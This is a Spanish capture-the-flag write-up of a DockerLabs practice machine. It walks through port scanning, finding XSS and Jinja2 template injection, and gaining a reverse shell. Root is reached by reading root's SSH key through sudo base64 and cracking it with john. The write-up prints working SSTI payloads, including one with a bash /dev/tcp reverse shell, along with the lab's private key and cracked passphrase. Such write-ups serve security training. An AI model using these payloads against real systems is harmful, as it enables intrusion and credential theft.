#Writeups #Easy #DockerLabs

![dockerLabs.png](assets/dockerLabs.png)

Empezamos con un escaneo general de todos los puertos:

```bash
❯ sudo nmap -sS -p- -Pn --min-rate 5000 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 15:16 CEST
Nmap scan report for 172.17.0.2
Host is up (0.0000060s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds

```

Vemos que hay tres servicios, un ssh, un http y un servicio que por ahora nos aparece como desconocido en el puerto 8089.

Vamos a hacer un escaneo mas profundo:

```bash
❯ sudo nmap -sCV -p22,80,8089 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 15:17 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000033s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
|_  256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
8089/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 29 May 2024 13:17:11 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 537
|     Connection: close
|     <html><head><title>Dale duro bro</title><style>body {margin: 90px; background-image: url('/static/1366_2000.jpg');}</style></head><body>
|     <h1>Nada interesante que buscar</h1>
|     <form>
|     <input name="user" style="border: 2px solid #0000FF; padding: 10px; border-radius: 10px; margin-bottom: 25px;" value="Hola"><br>
|     <input type="submit" value="No hay nada enserio, no toques" style="border: 0px; padding: 5px 20px ; color: #0000FF;">
|     </form>
|     <br><p style="margin-top: 30px;">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 29 May 2024 13:17:11 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8089-TCP:V=7.94SVN%I=7%D=5/29%Time=66572AD7%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,2C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Wed,\x2029\x20May\x202024\x2013:17:11\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20537\r\nConnection:\x20close\r\n\r\n\n\x20\x20\x20\x20<html><head><t
SF:itle>Dale\x20duro\x20bro</title><style>body\x20{margin:\x2090px;\x20bac
SF:kground-image:\x20url\('/static/1366_2000\.jpg'\);}</style></head><body
SF:>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Nada\x20intere
SF:sante\x20que\x20buscar</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<form>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"user\"\x20style=\"border
SF::\x202px\x20solid\x20#0000FF;\x20padding:\x2010px;\x20border-radius:\x2
SF:010px;\x20margin-bottom:\x2025px;\"\x20value=\"Hola\"><br>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<input\x20type=\"submit\"\x20value=\"No\x20hay\x20
SF:nada\x20enserio,\x20no\x20toques\"\x20style=\"border:\x200px;\x20paddin
SF:g:\x205px\x2020px\x20;\x20color:\x20#0000FF;\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20</form>\n\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20<b
SF:r><p\x20style=\"margin-top:\x2030px;\">\n\x20\x20\x20\x20")%r(HTTPOptio
SF:ns,C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20Python/
SF:3\.11\.2\r\nDate:\x20Wed,\x2029\x20May\x202024\x2013:17:11\x20GMT\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEA
SF:D,\x20GET\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(R
SF:TSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20
SF:\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x2
SF:0\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>E
SF:rror\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x
SF:20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.18 seconds
```

Con esto vemos que el puerto 80 aloja un apache normal, hice unas búsquedas y busqué directorios con gobuster pero no encontré nada.

Así que vamos a la web del puerto 8089 y encuentro esto: 

![browebverdejo.png](assets/browebverdejo.png)

Un formulario, vamos a tocar el click de abajo.

![holaverdejo.png](assets/holaverdejo.png)

Parece que la palabra por defecto de Hola que hemos enviado en el form se muestra en el mensaje, por eso vemos " Hola Hola " vamos a ver si podemos hacer un XSS básico:

![formxssverdejo.png](assets/formxssverdejo.png)

Lo ponemos así y le damos click al enlace:

![xssverdejo.png](assets/xssverdejo.png)

Hay XSS, con esto decido hacer un whatweb para ver que tecnologías están por detrás:

```bash
❯ whatweb http://172.17.0.2:8089
http://172.17.0.2:8089 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[Dale duro bro], Werkzeug[2.2.2]
```

Esta tecnología ya la he encontrado en la maquina de Pinguinazo de DockerLabs también, podemos estar ante un SSTI, así que vamos a hacerle una inyección básica de código:

```
{{5*5}}
```

Si nos multiplica las cifras, entonces la web es vulnerable a STTI:

![xssfuncionaverdejo.png](assets/xssfuncionaverdejo.png)

Acabamos de encontrar un SSTI, así que vamos a intentar inyectar código malicioso para obtener una reverse shell, este payload lo podéis encontrar en [HackTricks](https://book.hacktricks.xyz/) en la parte de SSTI Jinja2 para Python:

![sstijinja2.png](assets/sstijinja2.png)

Lo modificamos para ver el passwd

```bash 
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat /et/passwd').read() }}
```

Insertamos el codigo en el formulario y damos al enlace de abajo

![sstiverdejo.png](assets/sstiverdejo.png)

Nos da todo el passwd, podemos conseguir una reverse shell:

![passwdverdejo.png](assets/passwdverdejo.png)

En la web RevShells obtenemos una revserse shell one liner de bash y la ponemos al código:

```bash
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1"').read() }}
```

Insertamos el código en el formaulario con tu ip y puerto que vas a poner a escuchar en net cat antes de darle click al formulario:

```bash
❯ nc -lvnp 1234
listening on [any] 1234 ...

```

Damos click al formulario y obtenemos acceso:

```bash
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.1.217] from (UNKNOWN) [172.17.0.2] 45754
bash: cannot set terminal process group (94): Inappropriate ioctl for device
bash: no job control in this shell
verde@66c9b1b69b4b:~$ 
```

Hacemos un tratamiento de la tty

```bash
script /dev/null -c bash
# Dale a CTRL + Z y aunque parezca que se vaya la consola introduce los siguientes comandos:

stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

Enumeramos permisos

```bash
verde@66c9b1b69b4b:~$ id
id
uid=1000(verde) gid=1000(verde) groups=1000(verde)
verde@66c9b1b69b4b:~$ sudo -l
sudo -l
Matching Defaults entries for verde on 66c9b1b69b4b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User verde may run the following commands on 66c9b1b69b4b:
    (root) NOPASSWD: /usr/bin/base64
```

Encontramos un permiso sudo para leer archivos como root, con esto lo que podríamos hacer es leer archivos del dominio de root, al tener el servicio ssh, root podría tener un id_rsa en su carpeta de -ssh, vamos a ver:

```bash
verde@66c9b1b69b4b:~$ sudo base64 /root/.ssh/id_rsa | base64 --decode
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAHul0xZQ
r68d1eRBMAoL1IAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDbTQGZZWBB
VRdf31TPoa0wcuFMcqXJhxfX9HqhmcePAyZMxtgChQzYmmzRgkYH6jBTXSnNanTe4A0KME
c/77xWmJzvgvKyjmFmbvSu9sJuYABrP7yiTgiWY752nL4jeX5tXWT3t1XchSfFg50CqSfo
KHXV3Jl/vv/alUFgiKkQj6Bt3KogX4QXibU34xGIc24tnHMvph0jdLrR7BigwDkY2jZKOt
0aa7zBz5R2qwS3gT6cmHcKKHfv3pEljglomNCHhHGnEZjyVYFvSp+DxgOvmn1/pSEzUU4k
P/42fNSeERLcyHdVZvUt9PyPJpDvEQvULkqvicRSZ4VI0WmBrPwWWth4SMFOg+wnEIGvN4
tXtasHzHvdK9Lue2e3YiiFSOOkl0ZjzeYSBFZg3bMvu32SXKrvPjcsDlG1eByfqNV+lp2g
6EiGBk1eyrqb3INWp/KqVHvDObgC8aqg3SGI/6LM3wGdZ5tdEDEtELeHrrPtS/Xhhnq/cf
MNdrV9bsba/z9amMVWhAAlfX8xb4W7rdhgGH20PxaOfCZYQM6qjAClLBWP/rsX/3FGopi7
/fn6sD728szK2Q3nOoco+kBAdovd5vLOJxhbTec/QPPvNNS2zvGYv4liNoRQ9x8otaYdV+
+vvWPUk/oI3IaL15PWuD5o6SWTvpdSRY3OJhDVRR16jQAAB1AAatpK/Zsig5ZccWbZCeCG
bc3wbJWERECc8LV5Z3AyEwlvVxYiWNfqAso3YSx/e79qHy8yI5rSzwn344A/gtABC1zq9I
7+ty41e5mx7+AJON/ia3sBgJMoedBDKisNLEyBks1W1x4ru5Scu+gtRx+5BvoYFz/bEXCh
CnbADs0PxQVBGj9IqJWNnEDzKbYl7hCK/fTs4C+4mCkzLx/P7vtTy0AaLKbgvsYxQ7gQgq
/LfqhvT34EGvx5rH8N+zvkQ3pFZXV2txAt5oYKX4Nk0xeTiv4mmTCGAh16/VLycne/DMP5
XmK+2Ehn7ljcMtOSxDacI/TV8Fg5bfiz/3g4tYEZdXk9c2/3lvZCx1pRZthwU0fwrU7lPT
gIMdT4PMSpmBvOBCrUirUgc/kfWFBg6moPgSvpIz6h6S619iB8dPjYUMBOuE0jlXlEClog
/eZx9/IsBrT07A1kZnks5iKOm88EN4gUQUJyilidu+IuxABGXkQmkAtlDzxq2RW9mvVCzG
hUED4Xp8x00Ej3sjrGYer7jdtVLjrNSyo7RYQpsCVhFu70At2/R4jaDMliybbQ7VyWhG89
aRq00yKkypCu/H3layXfq0ANouPUESLrcFjjcf1O8xmVvugX6N+iz74r7H+mYELukfP2rX
qeITCVHeex1/x0bW50xXOQqsrR0VkYGGAFHS0DlHC7qDccqckGb+dofG4Rfo8vqwJ5/cHp
6ZIRAzV6v3vftFhYZjDrvqw1qMCvw1GdUsFFfwci5D5bcHAmV48zYWeaS2Z3RSkDyBcC55
ZwvjjcxqNcGus0bPhCJizu87YRFslp5+sWaV4JEm3h7NMEgBO4pfO7T9NW/ABQQZZ/PRzU
lB5Ttoru4f1sNpjjQGjsoKvIHNf/7vy5B6QEi+TNHt+EYkvTLzsqJ+ztnzXZFz6HyOOQQE
ET2k8MS0CQ+xkADdEhVTe/3cWRW1h62/mQRepDhLDKOao1N/v+pJr7hyOu/3cJQQqHp42T
l694QKc3L7PabGHlUtOWjpc//KW0NjQmRZDD1SCvUovtk7f/vKcvx5Ouo6d9P5R6tCmlf1
3MN60HuZW0gcCwJtHxDWAbMZ6C19W3udwRFN15UslvzAnbSo5HEiR+Z3GKFty0WZvLxsyc
ydr9xXY14IVl+1EoMktBRzzm69gB7JLWI9lGpiLGFzBwq42SBx2dXhlD7YWGvk+k1+gyNm
z2BUXmaHHbQlH/VuJyNiGj1vOOFg9J9qG6gBe4B/nOG+7se+ymf/iC7bd360J6SSED/tHR
bwk5IZuhzu6TiPyhmvn2WDwNg1XOBAzJdKxBvb7OyyQM9sTf71+Scji/jXzIK5EaRaVW8R
7I9PVUQhAtw0EgEL5aVl99T3TOtswlcAorZSxsjPOJDMPGZmD8Z8//GtrdZI9ZuVYLNim4
uj05VZvppDx/7WPOp+UUdyJQc9hC7UYnbbyt/Nd1SnsPewlDrmT1kTjV8+0idWsBPISsnI
4Axq7kjZyF8R3JIdCbIbXl1L/osa8TXYHhP7PBbmy18y+5hbRuSknZgJ21GL81fEMFFB4v
y/muoVVDSlPusZDIJBugAB3srVthQ50FPCNjEghCvg7eMIsmtjrOmrsF2TgMj4D62WK7cr
zChQuP3F05Cu+wJfEheD9g5k7JYrrPEgWLMPj7UMcXejMexLt+hrgds7NVJJVcv+lRPUUK
AJJu8PaHCi1CzXUWGHq6LS67gYuTdZNFigIstXWxy4BQaDIegOJMakL8NVrzZaCtpKWwi2
fkrPgzime/sZHU8GdBExpDBXAgLCMePHkjWIS9UjVwFxx3oGxLwWugmnUMcNAlR16+HmXX
AOBPsy33cSnIigPmTwSsT1C7rsf01PvEY4aeIQRbqc6HkIwUQCuzw+Xy1pq1Cm3lCA5iiH
Z+LGGkwDUg5Qo3vYrXYdmliQAfCifqBq2JhxU4N5jKUOMdml9O2PLU1W0f460a85lN1Jpi
8oT51if9kbbjFK26s7FzjDhKsP5BlTSkOJC005RpskyI3mN8mDEeTURGiiPnJYmo3t/sF2
01E4FZhMMJ0XJPUh3zFcZNgnUfEsyqOz7RyeIg82BO79Ud0/CHhCGstf5jg732HW+f4zC2
VetA3RoPGvqSDQpLmvsf0WN0k0iFJpbXit3K91kOejiGgDTa9vBQItAIdB8zFWFaIqW5qN
7qYQNNjh7sqFm4HGmTIQE/jNXwl+ea5PPK+s5jSw7Tk/lKnMKlqs/8VG6QTf41k5q9WW0u
MBnyhQnbl/InZ9rCP07RBhRXWw8Jva6nYTTFQ478B+ZI2mB9aOiODzooDbgoDiUqKx3mqD
Il/gI3f1l4YTSf/u4JbWrZq+eM4rXwV0pKEzt0BAwOQyGmYkFLWXjI/qtVsoeOGM6dHl1y
U21YeBLGkC2aAEPH7sOcaU5rbR9ra6Fb22zgkso3f6lrLzuz/AB9XjF571YzdDdZ/36xEW
vEACJSQrQKz9mWnewtRP5pzZk=
-----END OPENSSH PRIVATE KEY-----
```

Conseguimos leer el id_rsa, vamos a tratarlo con john

```bash
❯ nano id_rsa
❯ ssh2john id_rsa > hash_root
```

Hacemos un nano, copiamos todo el id_rsa, y con ssh2john lo hasheamos para poder crackearlo con john:

```bash
❯ john hash_root --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
honda1           (id_rsa)     
1g 0:00:00:45 DONE (2024-05-29 16:44) 0.02212g/s 78.58p/s 78.58c/s 78.58C/s girls..01234
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Obtenemos la contraseña, honda1, con esto cambiamos permisos al id_rsa para que nos permita ejecutarlo en el ssh e intentamos conectarnos:

```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@172.17.0.2
```

Obtenemos acceso como root:

![rootVerdejo.png](assets/rootVerdejo.png)

